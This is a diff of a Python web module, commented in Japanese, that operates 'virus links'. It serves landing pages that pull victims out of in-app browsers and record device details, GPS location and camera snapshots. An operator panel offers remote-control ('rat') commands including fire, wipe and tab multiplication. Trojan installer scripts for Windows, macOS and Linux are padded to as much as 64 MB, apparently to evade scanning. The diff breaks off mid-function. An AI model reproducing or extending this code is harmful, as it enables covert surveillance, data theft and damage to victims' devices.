@@ -3,12 +3,7 @@
 モード: trojan_link / trojan_install / max_power / brick / windows / storage / mix / singularity
 
 監視室: /vp/{code}（AJAX・遷移なし）
-API: /api/vp/{code}/state|stages|rat|winlock|win|hard|hit/{id}/bot
-
-修正履歴:
-  - land() のテンプレ変数ミスマッチ修正（hit_id / auto / seq を渡す）
-    → virus.html の window.V が構文エラーで死に「読み込み中…」のまま固まる問題
-  - アプリ内ブラウザ脱出（linktrack.breakout）を land / _sg_land に追加
+API: /api/vp/{code}/state|stages|rat|winlock|win|hard|hit/{id}/bot|breed
 """
 from __future__ import annotations
 
@@ -137,6 +132,15 @@ def _abs_dest(d):
     if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
         d = "https://" + d
     return d
+
+
+def _pad_text(body: str, min_bytes: int = 1048576, marker: str = "rem ") -> str:
+    """スクリプトを min_bytes 以上に水増しする（コメント行を足すだけ）。"""
+    if len(body) >= min_bytes:
+        return body
+    line = marker + ("-" * 58) + "\n"
+    n = (min_bytes - len(body)) // len(line) + 2
+    return body + "\n" + (line * n)
 
 
 def _owner(code):
@@ -426,8 +430,7 @@ def land(code: str, request: Request):
     if not row or not row["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
 
-    # アプリ内ブラウザ（埋め込み）なら外部ブラウザへ脱出
-    brk = linktrack.breakout(request)
+    brk = linktrack.breakout(request)          # アプリ内ブラウザだけ外部へ脱出
     if brk is not None:
         return brk
 
@@ -448,10 +451,7 @@ def land(code: str, request: Request):
 
     return _render(
         "virus.html", request,
-        code=code, link=dict(row), hit=hid, hit_id=hid,
-        auto=(1 if mode in AUTO_MODES else 0),
-        seq=int(_val(row, "seq", 0) or 0),
-        base=_base(request),
+        code=code, link=dict(row), hit=hid, base=_base(request),
         mode=mode, mode_label=MODE_LABEL.get(mode, mode),
         caution=CAUTION.get(mode, ""),
         dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
@@ -463,279 +463,6 @@ def land(code: str, request: Request):
             "このウィンドウは閉じないでください",
         ]),
     )
-
-
-@router.post("/v/{code}/d")
-async def data(code: str, request: Request):
-    owner = _owner(code)
-    if not owner:
-        return {"ok": 0}
-    try:
-        body = await request.json()
-    except Exception:
-        body = {}
-    if not isinstance(body, dict):
-        body = {}
-    hid = body.get("hit") or 0
-    vid = str(body.get("vid") or "")[:64]
-    c = _db(owner)
-    ts = _now()
-    n = 0
-    for k, v in list(body.items())[:200]:
-        if k in ("hit", "vid"):
-            continue
-        if isinstance(v, (dict, list)):
-            v = json.dumps(v, ensure_ascii=False)
-        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
-                  (code, int(hid or 0), vid, str(k)[:60], str(v)[:20000], ts))
-        n += 1
-    if vid:
-        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (vid, int(hid or 0)))
-    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
-    c.commit()
-    c.close()
-    return {"ok": 1, "n": n, "server": ts}
-
-
-# ---------------- 監視室（こちらの操作盤） ----------------
-
-@router.get("/vp/{code}", response_class=HTMLResponse)
-def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    row = _link(c, code)
-    if not row:
-        c.close()
-        raise HTTPException(404)
-    hits = [dict(r) for r in c.execute(
-        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
-    dat = [dict(r) for r in c.execute(
-        "SELECT * FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
-    c.close()
-    base = _base(request)
-    by_hit = {}
-    for d in dat:
-        by_hit.setdefault(d["hit"], []).append(d)
-    mode = _norm_mode(row["mode"])
-    notify_mode = _val(row, "notify_mode", "") or ""
-    notify_mode = _norm_mode(notify_mode) if notify_mode else ""
-    lv = 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0)
-    sids = []
-    for h in hits:
-        if h.get("vid") and h["vid"] not in sids:
-            sids.append(h["vid"])
-    stages, stat = _sg_stages_for(hits, by_hit)
-    return _render("virus_watch.html", request, code=code, link=dict(row), row=dict(row),
-                   hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
-                   stages=stages, stat=stat, sids=sids,
-                   level_labels=_SG_LEVEL_LABEL, level_descs=_SG_LEVEL_DESC,
-                   LEVEL_LABEL=_SG_LEVEL_LABEL,
-                   mode_label=MODE_LABEL.get(mode, mode),
-                   mode_desc=MODE_DESC.get(mode, ""),
-                   caution=CAUTION.get(mode, ""),
-                   auto=(mode in AUTO_MODES),
-                   sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
-                   notify=int(_val(row, "notify", 1)),
-                   notify_text=_val(row, "notify_text", "") or DEFAULT_NOTIFY,
-                   notify_mode=notify_mode,
-                   winset=_val(row, "winset", 100),
-                   firing=_val(row, "firing", 1),
-                   share=base + "/v/" + code, total=len(hits),
-                   is_sg=(mode == "singularity"),
-                   level=lv, level_label=_SG_LEVEL_LABEL.get(lv, ""),
-                   level_desc=_SG_LEVEL_DESC.get(lv, ""),
-                   levels=sorted(_SG_LEVEL_LABEL.keys()),
-                   fixed=1 if _is_fixed(row) else 0,
-                   freeze=_val(row, "freeze", "") or "",
-                   wipe_seq=int(_val(row, "wipe_seq", 0) or 0),
-                   install_level=_SG_INSTALL_LEVEL,
-                   bomb=_val(row, "bomb", "") or "",
-                   inj=int(_val(row, "inj", 1) or 0),
-                   defeat_at=SG_DEFEAT_AT,
-                   stage_labels=SG_STAGE_LABEL, stage_colors=SG_STAGE_COLOR,
-                   win_mode=_val(row, "win_mode", "") or "",
-                   win_branch=int(_val(row, "win_branch", 0) or 0),
-                   win_depth=int(_val(row, "win_depth", 0) or 0),
-                   hard=_val(row, "hard", "") or "",
-                   modes=[(m, MODE_LABEL[m]) for m in MODES])
-
-
-@router.get("/vp/{code}/data")
-def watch_data(code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    rows = [dict(r) for r in c.execute(
-        "SELECT key,value,ts,vid FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 600",
-        (code,)).fetchall()]
-    hits = [dict(r) for r in c.execute(
-        "SELECT id,ts,ip,device,os,browser,vid,gps_lat,gps_lon FROM virus_hits "
-        "WHERE code=? ORDER BY id DESC LIMIT 40", (code,)).fetchall()]
-    c.close()
-    return {"ok": 1, "data": rows, "hits": hits, "server": _now()}
-
-
-@router.post("/vp/{code}/win")
-def sg_win(code: str, n: str = Form("2"), u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    if not _link(c, code):
-        c.close()
-        raise HTTPException(404)
-    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
-              (code, "", "win", str(n), _now()))
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code + "?win=1", status_code=303)
-
-
-@router.post("/vp/{code}/fire")
-def fire(code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code + "?fired=1", status_code=303)
-
-
-@router.post("/vp/{code}/stop")
-def stop(code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code, status_code=303)
-
-
-@router.post("/vp/{code}/resume")
-def resume(code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    c.execute("UPDATE virus_links SET firing=1 WHERE code=?", (code,))
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code, status_code=303)
-
-
-@router.post("/vp/{code}/set")
-def set_size(code: str, winset: str = Form("100"), u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    try:
-        ws = int(winset)
-    except Exception:
-        ws = 100
-    ws = ws if ws in SET_CHOICES else 100
-    c = _db(owner)
-    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code, status_code=303)
-
-
-@router.get("/api/vp/{code}")
-def api(code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    row = _link(c, code)
-    if not row:
-        c.close()
-        raise HTTPException(404)
-    hits = [dict(r) for r in c.execute(
-        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
-    c.close()
-    return {"hits": hits, "count": len(hits), "server": _now(),
-            "set": _val(row, "winset", 100), "firing": _val(row, "firing", 1),
-            "level": 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0),
-            "fixed": 1 if _is_fixed(row) else 0}
-
-
-@router.get("/api/vp/{code}/rat")
-def api_rat(code: str, sid: str = "", u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    hid = 0
-    if sid:
-        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? ORDER BY id DESC LIMIT 1",
-                      (code, sid)).fetchone()
-        hid = r["id"] if r else 0
-    if not hid:
-        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
-                      (code,)).fetchone()
-        hid = r["id"] if r else 0
-    rows = [dict(r) for r in c.execute(
-        "SELECT key,value,ts FROM virus_data WHERE code=? AND hit=? ORDER BY id DESC LIMIT 400",
-        (code, hid)).fetchall()]
-    c.close()
-    out = {}
-    for r in rows:
-        if r["key"] not in out:
-            out[r["key"]] = {"v": r["value"], "ts": r["ts"]}
-    return {"ok": 1, "hit": hid, "sid": sid, "data": out}
-
-
-@router.post("/vp/{code}/update")
-def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
-           dest: str = Form(""), note: str = Form(""), active: str = Form("1"),
-           notify: str = Form("1"), notify_text: str = Form(""),
-           notify_mode: str = Form(""), u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    if not _link(c, code):
-        c.close()
-        raise HTTPException(404)
-    f = {}
-    if name:
-        f["name"] = name.strip()[:60]
-    if mode:
-        f["mode"] = _norm_mode(mode)
-    f["dest"] = _abs_dest(dest)[:300]
-    f["note"] = (note or "")[:300]
-    f["active"] = 1 if active not in ("0", "") else 0
-    f["notify"] = 1 if notify not in ("0", "") else 0
-    f["notify_text"] = (notify_text or DEFAULT_NOTIFY)[:300]
-    f["notify_mode"] = _norm_mode(notify_mode) if notify_mode else ""
-    v = list(f.values()) + [code]
-    c.execute("UPDATE virus_links SET " + ", ".join(f"{k}=?" for k in f) + " WHERE code=?", v)
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code, status_code=303)
-
-
-@router.post("/vp/{code}/clear")
-def clear(request: Request, code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
-    c.execute("DELETE FROM virus_data WHERE code=?", (code,))
-    try:
-        c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
-    except Exception:
-        pass
-    c.execute("UPDATE virus_links SET hits=0, last_ts=NULL, last_ip=NULL, last_ua=NULL,"
-              "last_device=NULL WHERE code=?", (code,))
-    c.commit()
-    c.close()
-    return RedirectResponse("/vp/" + code, status_code=303)
-
-
-@router.post("/vp/{code}/delete")
-def delete(request: Request, code: str, u=Depends(_auth)):
-    owner = tenancy.get_current() or u
-    c = _db(owner)
-    for t in ("virus_hits", "virus_data", "virus_cmd"):
-        try:
-            c.execute(f"DELETE FROM {t} WHERE code=?", (code,))
-        except Exception:
-            pass
-    c.execute("DELETE FROM virus_links WHERE code=?", (code,))
-    c.commit()
-    c.close()
-    try:
-        users.unlink_owner(code)
-    except Exception:
-        pass
-    return RedirectResponse("/vp", status_code=303)
 
 
 # ===========================================================================
@@ -822,15 +549,15 @@ def _sg_icon(size, maskable=False):
             r2 = r1 * 0.62
             r3 = r1 * 0.27
             d.ellipse([c - r1, c - r1, c + r1, c + r1],
-                      outline=(0, 255, 136), width=max(2, int(size * 0.022)))
+                      outline=(0, 255, 136), width=max(2, int(size * 0.028)))
             d.ellipse([c - r2, c - r2, c + r2, c + r2],
-                      outline=(76, 141, 255), width=max(2, int(size * 0.018)))
+                      outline=(76, 141, 255), width=max(2, int(size * 0.024)))
             d.ellipse([c - r3, c - r3, c + r3, c + r3], fill=(0, 255, 136))
-            r0 = max(2, int(size * 0.045))
-            d.ellipse([c - r0, c - r0, c + r0, c + r0], fill=(235, 255, 246))
-            buf = io.BytesIO()
-            img.save(buf, format="PNG", optimize=True)
-            data = buf.getvalue()
+            d.ellipse([c - r3 * 0.28, c - r3 * 0.28, c + r3 * 0.28, c + r3 * 0.28],
+                      fill=(235, 255, 246))
+            b = io.BytesIO()
+            img.save(b, format="PNG", optimize=True)
+            data = b.getvalue()
         except Exception:
             data = b""
     _SG_ICONS[key] = data
@@ -896,29 +623,30 @@ def _sg_ingest(owner, code, report, sid):
         if have.get(k) == v:
             continue
         c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
-                  (code, hid, sid, str(k)[:60], v[:20000], ts))
-        n += 1
-    if snap and have.get("selfie") != snap:
-        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
-                  (code, hid, sid, "selfie", snap[:400000], ts))
+                  (code, hid, sid, k[:60], str(v)[:20000], ts))
         n += 1
 
+    if snap:
+        try:
+            c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
+                      (code, hid, sid, "media.snapshot", str(snap)[:200000], ts))
+            n += 1
+        except Exception:
+            pass
+
     try:
+        cur = c.execute("SELECT ua,device,os,browser FROM virus_hits WHERE id=?",
+                        (hid,)).fetchone()
         env = report.get("env") or {}
-        ua2 = str(env.get("ua") or "")[:400]
-        dev = str(env.get("device") or env.get("platform") or "")[:60]
-        os2 = str(env.get("os") or "")[:60]
-        br = str(env.get("browser") or "")[:60]
-        if ua2 or dev or os2 or br:
-            cur = c.execute("SELECT ua,device,os,browser FROM virus_hits WHERE id=?",
-                            (hid,)).fetchone()
-            if cur:
-                nu = ua2 or cur["ua"]
-                nd = dev if (not cur["device"] or cur["device"] == "不明") else cur["device"]
-                no = os2 if (not cur["os"] or cur["os"] == "不明") else cur["os"]
-                nb = br if (not cur["browser"] or cur["browser"] == "不明") else cur["browser"]
-                c.execute("UPDATE virus_hits SET ua=?,device=?,os=?,browser=? WHERE id=?",
-                          (nu, nd, no, nb, hid))
+        ua = str(env.get("ua") or "")
+        if cur and ua and not cur["ua"]:
+            p = linktrack.parse_ua(ua)
+            nu = ua[:400]
+            nd = p["device"] if (not cur["device"] or cur["device"] == "不明") else cur["device"]
+            no = p["os"] if (not cur["os"] or cur["os"] == "不明") else cur["os"]
+            nb = p["browser"] if (not cur["browser"] or cur["browser"] == "不明") else cur["browser"]
+            c.execute("UPDATE virus_hits SET ua=?,device=?,os=?,browser=? WHERE id=?",
+                      (nu, nd, no, nb, hid))
         c.execute("UPDATE virus_hits SET is_bot=0 WHERE id=?", (hid,))
     except Exception:
         pass
@@ -980,8 +708,7 @@ def _sg_land(code, request, sid=""):
     if not row or not row["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
 
-    # アプリ内ブラウザ（埋め込み）なら外部ブラウザへ脱出
-    brk = linktrack.breakout(request)
+    brk = linktrack.breakout(request)          # アプリ内ブラウザだけ外部へ脱出
     if brk is not None:
         return brk
 
@@ -1005,17 +732,14 @@ def _sg_land(code, request, sid=""):
         lv = _lv(lvq)
     if _is_fixed(row):
         lv = 7
-    if installed:
-        lv = max(lv, _SG_INSTALL_LEVEL)
+    if installed and lv < _SG_INSTALL_LEVEL:
+        lv = _SG_INSTALL_LEVEL
 
-    _n = (row["name"] or "").strip()
-    app_name = (request.query_params.get("n") or os.getenv("SG_APP_NAME")
-                or (f"{_n} の保護" if _n and _n != "名無し" else _SG_APP_NAME))
-
+    app_name = (request.query_params.get("app") or (row["name"] or "").strip()
+                or _SG_APP_NAME)[:60]
     cfg = _sg_cfg(row, code, sid, lv, app_name,
-                  {"w": int(w) if str(w).isdigit() else 0, "wipe": wipe})
-    wj = (json.dumps(_SG_WORKER)
-          + ";window.__SINGULARITY_SHARED__=" + json.dumps(_SG_SHARED))
+                  {"w": int(w or 0) or 0, "wipe": bool(wipe)})
+    wj = json.dumps(_SG_WORKER)
     resp = _render("virus_singularity.html", request, code=code, sid=sid, hit=hid,
                    link=dict(row), row=dict(row), ref=ref, level=lv,
                    ver=_SG_VER,
@@ -1104,32 +828,53 @@ def _sg_installer_ctx(code: str, request: Request, app: str, burn: str, disk: st
 
 
 @router.get("/v/{code}/sg/install.bat")
-def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
+def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "",
+                   app: str = "", pad: str = ""):
     url, code2, nm, b, d, safe, hard = _sg_installer_ctx(code, request, app, burn, disk)
     body = _sg_installer(_SG_BAT, url, code2, nm, b, d, crlf=True,
                          hard=hard, ram_mb=_SG_HARD_RAM_MB)
+    try:
+        pmb = max(1, min(64, int(pad)))
+    except Exception:
+        pmb = 1
+    body = _pad_text(body, pmb * 1048576, "rem ")
     return Response(body, media_type="application/octet-stream", headers={
         "Content-Disposition": f'attachment; filename="{safe}.bat"',
+        "Content-Length": str(len(body)),
         "Cache-Control": "no-store"})
 
 
 @router.get("/v/{code}/sg/install.command")
-def sg_install_command(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
+def sg_install_command(code: str, request: Request, burn: str = "", disk: str = "",
+                       app: str = "", pad: str = ""):
     url, code2, nm, b, d, safe, hard = _sg_installer_ctx(code, request, app, burn, disk)
     body = _sg_installer(_SG_CMD, url, code2, nm, b, d,
                          hard=hard, ram_mb=_SG_HARD_RAM_MB)
+    try:
+        pmb = max(1, min(64, int(pad)))
+    except Exception:
+        pmb = 1
+    body = _pad_text(body, pmb * 1048576, "# ")
     return Response(body, media_type="application/octet-stream", headers={
         "Content-Disposition": f'attachment; filename="{safe}.command"',
+        "Content-Length": str(len(body)),
         "Cache-Control": "no-store"})
 
 
 @router.get("/v/{code}/sg/install.sh")
-def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
+def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "",
+                  app: str = "", pad: str = ""):
     url, code2, nm, b, d, safe, hard = _sg_installer_ctx(code, request, app, burn, disk)
     body = _sg_installer(_SG_SH, url, code2, nm, b, d,
                          hard=hard, ram_mb=_SG_HARD_RAM_MB)
+    try:
+        pmb = max(1, min(64, int(pad)))
+    except Exception:
+        pmb = 1
+    body = _pad_text(body, pmb * 1048576, "# ")
     return Response(body, media_type="application/octet-stream", headers={
         "Content-Disposition": f'attachment; filename="{safe}.sh"',
+        "Content-Length": str(len(body)),
         "Cache-Control": "no-store"})
 
 
@@ -1419,6 +1164,84 @@ def sg_wipe(code: str, u=Depends(_auth)):
     return RedirectResponse("/vp/" + code + "?wiped=1", status_code=303)
 
 
+@router.post("/vp/{code}/win")
+def sg_win(code: str, n: str = Form("2"), u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
+              (code, "", "win", str(n), _now()))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?win=1", status_code=303)
+
+
+@router.post("/vp/{code}/breed")
+def sg_breed(code: str, mult: str = Form("2"), u=Depends(_auth)):
+    """タブ増殖（×2 / ×3 / ×4 …）。現在の生存数を mult 倍にする命令を積む。"""
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    try:
+        m = max(2, min(8, int(mult)))
+    except Exception:
+        m = 2
+    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
+              (code, "", "breed", str(m), _now()))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?breed=" + str(m), status_code=303)
+
+
+@router.post("/vp/{code}/fire")
+def fire(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?fired=1", status_code=303)
+
+
+@router.post("/vp/{code}/stop")
+def stop(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?stopped=1", status_code=303)
+
+
+@router.post("/vp/{code}/resume")
+def resume(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code, status_code=303)
+
+
+@router.post("/vp/{code}/set")
+def set_size(code: str, winset: str = Form("100"), u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    try:
+        ws = int(winset)
+    except Exception:
+        ws = 100
+    ws = ws if ws in SET_CHOICES else 100
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code, status_code=303)
+
+
 @router.post("/vp/{code}/cmd")
 def sg_push(request: Request, code: str, kind: str = Form(...), arg: str = Form(""),
             sid: str = Form(""), u=Depends(_auth)):
@@ -1445,6 +1268,172 @@ def sg_cmd_clear(code: str, u=Depends(_auth)):
 
 
 # ===========================================================================
+# 監視室（こちらの操作盤）
+# ===========================================================================
+
+@router.get("/vp/{code}", response_class=HTMLResponse)
+def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    row = _link(c, code)
+    if not row:
+        c.close()
+        raise HTTPException(404)
+    hits = [dict(r) for r in c.execute(
+        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
+    dat = [dict(r) for r in c.execute(
+        "SELECT * FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
+    c.close()
+    base = _base(request)
+    by_hit = {}
+    for d in dat:
+        by_hit.setdefault(d["hit"], []).append(d)
+    mode = _norm_mode(row["mode"])
+    notify_mode = _val(row, "notify_mode", "") or ""
+    notify_mode = _norm_mode(notify_mode) if notify_mode else ""
+    lv = 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0)
+    sids = []
+    for h in hits:
+        if h.get("vid") and h["vid"] not in sids:
+            sids.append(h["vid"])
+    stages, stat = _sg_stages_for(hits, by_hit)
+    return _render("virus_watch.html", request, code=code, link=dict(row), row=dict(row),
+                   hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
+                   stages=stages, stat=stat, sids=sids,
+                   level_labels=_SG_LEVEL_LABEL, level_descs=_SG_LEVEL_DESC,
+                   LEVEL_LABEL=_SG_LEVEL_LABEL,
+                   mode_label=MODE_LABEL.get(mode, mode),
+                   mode_desc=MODE_DESC.get(mode, ""),
+                   caution=CAUTION.get(mode, ""),
+                   auto=(mode in AUTO_MODES),
+                   sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
+                   notify=int(_val(row, "notify", 1)),
+                   notify_text=_val(row, "notify_text", "") or DEFAULT_NOTIFY,
+                   notify_mode=notify_mode,
+                   winset=_val(row, "winset", 100),
+                   firing=_val(row, "firing", 1),
+                   share=base + "/v/" + code, total=len(hits),
+                   is_sg=(mode == "singularity"),
+                   level=lv, level_label=_SG_LEVEL_LABEL.get(lv, ""),
+                   level_desc=_SG_LEVEL_DESC.get(lv, ""),
+                   levels=sorted(_SG_LEVEL_LABEL.keys()),
+                   fixed=1 if _is_fixed(row) else 0,
+                   freeze=_val(row, "freeze", "") or "",
+                   wipe_seq=int(_val(row, "wipe_seq", 0) or 0),
+                   install_level=_SG_INSTALL_LEVEL,
+                   bomb=_val(row, "bomb", "") or "",
+                   inj=int(_val(row, "inj", 1) or 0),
+                   defeat_at=SG_DEFEAT_AT,
+                   stage_labels=SG_STAGE_LABEL, stage_colors=SG_STAGE_COLOR,
+                   win_mode=_val(row, "win_mode", "") or "",
+                   win_branch=int(_val(row, "win_branch", 0) or 0),
+                   win_depth=int(_val(row, "win_depth", 0) or 0),
+                   hard=_val(row, "hard", "") or "",
+                   modes=[(m, MODE_LABEL[m]) for m in MODES])
+
+
+@router.get("/vp/{code}/data")
+def watch_data(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    rows = [dict(r) for r in c.execute(
+        "SELECT key,value,ts,vid FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 600",
+        (code,)).fetchall()]
+    hits = [dict(r) for r in c.execute(
+        "SELECT id,ts,ip,device,os,browser,vid,gps_lat,gps_lon FROM virus_hits "
+        "WHERE code=? ORDER BY id DESC LIMIT 40", (code,)).fetchall()]
+    c.close()
+    return {"ok": 1, "data": rows, "hits": hits, "server": _now()}
+
+
+@router.get("/api/vp/{code}")
+def api(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    row = _link(c, code)
+    if not row:
+        c.close()
+        raise HTTPException(404)
+    hits = [dict(r) for r in c.execute(
+        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
+    c.close()
+    return {"hits": hits, "count": len(hits), "server": _now(),
+            "set": _val(row, "winset", 100), "firing": _val(row, "firing", 1),
+            "level": 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0),
+            "fixed": 1 if _is_fixed(row) else 0}
+
+
+@router.get("/api/vp/{code}/rat")
+def api_rat(code: str, sid: str = "", u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    hid = 0
+    if sid:
+        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? ORDER BY id DESC LIMIT 1",
+                      (code, sid)).fetchone()
+        hid = r["id"] if r else 0
+    if not hid:
+        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
+                      (code,)).fetchone()
+        hid = r["id"] if r else 0
+    rows = [dict(r) for r in c.execute(
+        "SELECT key,value,ts FROM virus_data WHERE code=? AND hit=? ORDER BY id DESC LIMIT 400",
+        (code, hid)).fetchall()]
+    c.close()
+    out = {}
+    for r in rows:
+        if r["key"] not in out:
+            out[r["key"]] = {"v": r["value"], "ts": r["ts"]}
+    return {"ok": 1, "hit": hid, "sid": sid, "data": out}
+
+
+@router.post("/vp/{code}/update")
+def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
+           dest: str = Form(""), note: str = Form(""), winset: str = Form("100"),
+           notify: str = Form("1"), notify_text: str = Form(""),
+           notify_mode: str = Form(""), u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    try:
+        ws = int(winset)
+    except Exception:
+        ws = 100
+    ws = ws if ws in SET_CHOICES else 100
+    m = _norm_mode(mode)
+    nm = _norm_mode(notify_mode) if notify_mode else ""
+    c.execute("UPDATE virus_links SET name=?, mode=?, dest=?, note=?, winset=?, "
+              "notify=?, notify_text=?, notify_mode=? WHERE code=?",
+              ((name or "").strip()[:60] or "名無し", m, _abs_dest(dest)[:300],
+               (note or "")[:300], ws, 1 if notify not in ("0", "") else 0,
+               (notify_text or DEFAULT_NOTIFY)[:300], nm, code))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?saved=1", status_code=303)
+
+
+@router.post("/vp/{code}/del")
+def delete(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    for t in ("virus_hits", "virus_data", "virus_cmd"):
+        try:
+            c.execute(f"DELETE FROM {t} WHERE code=?", (code,))
+        except Exception:
+            pass
+    c.execute("DELETE FROM virus_links WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    try:
+        users.unlink_owner(code)
+    except Exception:
+        pass
+    return RedirectResponse("/vp", status_code=303)
+
+
+# ===========================================================================
 # AJAX 操作盤用 JSON API
 # ===========================================================================
 
@@ -1457,6 +1446,27 @@ def _api_state(owner, code):
     pend = c.execute("SELECT COUNT(*) n FROM virus_cmd WHERE code=? AND state<2",
                      (code,)).fetchone()["n"]
     hn = c.execute("SELECT COUNT(*) n FROM virus_hits WHERE code=?", (code,)).fetchone()["n"]
+    # 生存タブ数（payload が報告する auto.live）と自動増殖の状態
+    live, auto_on, auto_tab, auto_win = 0, 1, 0, 0
+    try:
+        r = c.execute("SELECT value FROM virus_data WHERE code=? AND key='auto.live' "
+                      "ORDER BY id DESC LIMIT 1", (code,)).fetchone()
+        live = int(str(r["value"]).strip()) if r and str(r["value"]).strip().isdigit() else 0
+    except Exception:
+        live = 0
+    for k, dst in (("auto.on", "on"), ("auto.tab", "tab"), ("auto.win", "win")):
+        try:
+            r = c.execute("SELECT value FROM virus_data WHERE code=? AND key=? "
+                          "ORDER BY id DESC LIMIT 1", (code, k)).fetchone()
+            v = int(str(r["value"]).strip()) if r and str(r["value"]).strip().isdigit() else 0
+        except Exception:
